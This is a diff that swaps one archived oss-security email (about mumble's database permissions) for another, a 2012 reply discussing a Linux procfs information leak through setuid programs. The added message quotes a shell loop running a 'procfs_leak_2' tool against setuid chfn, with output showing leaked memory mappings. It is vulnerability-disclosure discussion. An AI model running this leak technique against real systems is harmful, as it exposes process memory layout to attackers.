@@ -1,43 +1,69 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/02/16/1
-Message-ID: <4F3D144B.9000709@suse.de>
-Date: Thu, 16 Feb 2012 15:35:55 +0100
-From: Ludwig Nussel <ludwig.nussel@...e.de>
-To: oss-security@...ts.openwall.com, Vincent Untz <vuntz@...nsuse.org>
-Subject: Re: CVE request: mumble local information disclosure
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/02/09/3
+Message-ID: <CAHmME9ofxu3M1s5HZ6pFhN54Aw4ZYngmuydPMtBubFHowF+Q-A@mail.gmail.com>
+Date: Thu, 9 Feb 2012 03:28:16 +0100
+From: "Jason A. Donenfeld" <Jason@...c4.com>
+To: Djalal Harouni <tixxdz@...ndz.org>
+Cc: oss-security@...ts.openwall.com
+Subject: Re: Linux procfs infoleaks via self-read by a SUID/SGID program (was: CVE-2011-3637 Linux kernel: proc: fix Oops on invalid /proc/<pid>/maps access)
 Content-Type: text/plain; charset=utf-8
 
-Vincent Danen wrote:
-> It was discovered that mumble created its database file
-> (~/.local/share/data/Mumble/.mumble.sqlite) with insecure world-readable
-> permissions.  If the user had (non-default) permissions on their home
-> directory, another local user could obtain password and configuration
-> settings from the database file.
+On Thu, Feb 9, 2012 at 00:03, Djalal Harouni <tixxdz@...ndz.org> wrote:
+>
+> BTW lseek() on seq files will only succeed on /proc/self/ files.
+>
+> chsh which is a setuid on most of the distros will read stdin and print
+> errors to stderr, this is why it can be used as a target program, I did
+> not search but if there is another program then it may be our 'winner'.
 
-It certainly makes sense for cautios applications to make sure sensitive
-settings have restricted access permissions. Question is whether it is
-actually a vulnerability if they don't. Quoting the XDG spec¹
+This issue is actually somewhat similar to the /proc/pid/mem issue a
+few weeks ago. Seems like Linus' logic from this commit [1] should be
+applied to the rest of proc.
 
-| If, when attempting to write a file, the destination directory is
-| non-existant an attempt should be made to create it with permission
-| 0700. If the destination directory exists already the permissions should
-| not be changed.
 
-So it could be argued that mumble just relied on the specification that
-already mandates restrictive permissions on ~/.config.
 
-The program that is supposed to create ~/.config on login had a bug that
-made the dir 755 in violation of the spec². Fixing the permissions is
-not allowed according to the spec though ...
+> $ for i in $(seq 460 480); \
+>  do ./procfs_leak_2 /usr/bin/chfn /proc/self/smaps $i; done
+> Password: chfn: PAM authentication failed
+> Password: chfn: PAM authentication failed
+> Password: chfn: PAM authentication failed
+> Password: chfn: PAM authentication failed
+> Password: chfn: PAM authentication failed
+> Password: chfn: PAM authentication failed
+> Password: chfn: PAM authentication failed
+> Password: chfn: PAM authentication failed
+> Password: Changing the user information for tixxdz
+> Enter the new value, or press ENTER for the default
+>        Full Name: tixxdz
+>                Room Number [er]:       Work Phone []:  Home Phone []:
+>                chfn: invalid room number: '00608000-0060a000 rw-p
+>                00008000 08:01 218841
+>                /usr/bin/chfn'
+> Password: chfn: PAM authentication failed
+> Password: chfn: PAM authentication failed
+>
+>
+> This was tested on Ubuntu, Debian default setuid 'chfn'.
+>
 
-cu
-Ludwig
+Awesome! Nice work.
 
-[1] http://standards.freedesktop.org/basedir-spec/basedir-spec-latest.html
-[2] https://bugs.freedesktop.org/show_bug.cgi?id=36773
+> You can do this to leak maps of libc... since the lseek() on /proc/self
+> will pass the ptrace_may_access() check.
 
--- 
- (o_   Ludwig Nussel
- //\
- V_/_  http://www.suse.de/
-SUSE LINUX Products GmbH, GF: Jeff Hawn, Jennifer Guild, Felix Imendörffer, HRB 16746 (AG Nürnberg) 
+
+> Solar as I've said above I believe that there is a compilcated problem
+> about these files, should I discuss them here or just finish my patches
+> and try to discuss them on lkml ?
+>
+
+Let me know if you move it to LKML -- I'm curious to see how this pans out.
+
+
+> Thanks.
+>
+> > Alexander
+>
+
+
+[1] http://git.kernel.org/?p=linux/kernel/git/torvalds/linux-2.6.git;a=commitdiff;h=e268337dfe26dfc7efd422a804dbb27977a3cccc
